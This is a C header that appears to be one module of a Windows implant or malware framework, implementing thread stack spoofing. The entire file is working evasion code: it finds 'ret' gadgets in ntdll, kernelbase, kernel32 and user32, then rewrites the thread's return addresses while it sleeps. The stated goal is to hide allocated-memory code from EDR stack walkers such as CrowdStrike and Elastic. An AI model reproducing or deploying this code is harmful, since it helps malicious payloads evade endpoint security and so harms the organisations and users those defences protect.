// chunk: evasion/thread_stack_spoof
// depends: (none)
// provides: tss_init, tss_sleep
// risk: low
// note: Thread stack spoofing — overwrites the current thread's call stack with
//       legitimate-looking frames during sleep. EDRs (CrowdStrike, Elastic) walk
//       thread stacks looking for "unbacked" return addresses pointing into
//       allocated memory. During sleep, replace our stack frames with ones that
//       point into loaded system DLLs. Based on CallStackMasker / Gargoyle.

#ifndef CHUNK_THREAD_STACK_SPOOF
#define CHUNK_THREAD_STACK_SPOOF

#include <windows.h>

typedef NTSTATUS (NTAPI *pNtQueryInformationThread)(HANDLE, ULONG, PVOID, ULONG, PULONG);

typedef struct _TSS_CONTEXT {
    PVOID real_stack_backup;
    SIZE_T backup_size;
    PVOID stack_base;
    PVOID stack_limit;
    PVOID fake_frames[8];
    int num_fake_frames;
} TSS_CONTEXT;

static TSS_CONTEXT _tss = {0};

static void _tss_find_return_addrs(void) {
    HMODULE mods[] = {
        GetModuleHandleA("ntdll.dll"),
        GetModuleHandleA("kernelbase.dll"),
        GetModuleHandleA("kernel32.dll"),
        GetModuleHandleA("user32.dll"),
    };

    _tss.num_fake_frames = 0;

    for (int m = 0; m < 4 && _tss.num_fake_frames < 8; m++) {
        if (!mods[m]) continue;

        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mods[m];
        PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((BYTE *)mods[m] + dos->e_lfanew);
        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(pe);

        for (WORD i = 0; i < pe->FileHeader.NumberOfSections; i++, sec++) {
            if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

            BYTE *base = (BYTE *)mods[m] + sec->VirtualAddress;
            BYTE *end = base + sec->Misc.VirtualSize;
            int skip = 0;

            for (BYTE *p = base + 0x40; p < end - 4 && _tss.num_fake_frames < 8; p++) {
                /* Look for 'ret' (C3) preceded by common epilogue patterns:
                   5D C3 = pop rbp; ret
                   C9 C3 = leave; ret
                   48 83 C4 XX C3 = add rsp, XX; ret */
                if (*p == 0xC3 && (*(p-1) == 0x5D || *(p-1) == 0xC9)) {
                    if (++skip < 3) continue;
                    _tss.fake_frames[_tss.num_fake_frames++] = p;
                    skip = 0;
                }
            }
            break;
        }
    }
}

static void tss_init(void) {
    NT_TIB *tib = (NT_TIB *)NtCurrentTeb();
    _tss.stack_base = tib->StackBase;
    _tss.stack_limit = tib->StackLimit;
    _tss_find_return_addrs();
}

/*
 * tss_sleep: Sleep with a spoofed thread stack.
 * 1. Backup current stack frames above RSP
 * 2. Overwrite with fake frames pointing to legitimate DLL addresses
 * 3. Sleep for the requested duration
 * 4. Restore real stack frames
 *
 * During the sleep, any EDR stack walker sees a call chain through
 * ntdll → kernelbase → kernel32 → user32 — completely normal.
 */
static void tss_sleep(DWORD ms) {
    if (_tss.num_fake_frames < 4) {
        Sleep(ms);
        return;
    }

    volatile PVOID rsp_val;
    __asm__ __volatile__ ("mov %%rsp, %0" : "=r" (rsp_val));

    /* We'll spoof the frames above our current RSP.
       Walk the RBP chain to find and replace return addresses. */
    PVOID *rbp_ptr;
    __asm__ __volatile__ ("mov %%rbp, %0" : "=r" (rbp_ptr));

    /* Save and replace up to num_fake_frames return addresses */
    PVOID saved_rets[8];
    PVOID *frame = rbp_ptr;
    int replaced = 0;

    for (int i = 0; i < _tss.num_fake_frames && frame; i++) {
        /* In x64, [rbp+8] is the return address, [rbp] is saved RBP */
        PVOID *ret_addr_slot = frame + 1;

        /* Bounds check — make sure we're within stack */
        if ((PVOID)ret_addr_slot < _tss.stack_limit ||
            (PVOID)ret_addr_slot >= _tss.stack_base)
            break;

        saved_rets[i] = *ret_addr_slot;
        *ret_addr_slot = _tss.fake_frames[i];
        replaced++;

        /* Follow RBP chain */
        PVOID *next_rbp = (PVOID *)*frame;
        if ((PVOID)next_rbp <= (PVOID)frame ||
            (PVOID)next_rbp >= _tss.stack_base)
            break;
        frame = next_rbp;
    }

    /* Sleep with spoofed stack */
    Sleep(ms);

    /* Restore real return addresses */
    frame = rbp_ptr;
    for (int i = 0; i < replaced && frame; i++) {
        PVOID *ret_addr_slot = frame + 1;
        if ((PVOID)ret_addr_slot < _tss.stack_limit ||
            (PVOID)ret_addr_slot >= _tss.stack_base)
            break;
        *ret_addr_slot = saved_rets[i];

        PVOID *next_rbp = (PVOID *)*frame;
        if ((PVOID)next_rbp <= (PVOID)frame ||
            (PVOID)next_rbp >= _tss.stack_base)
            break;
        frame = next_rbp;
    }
}

#endif
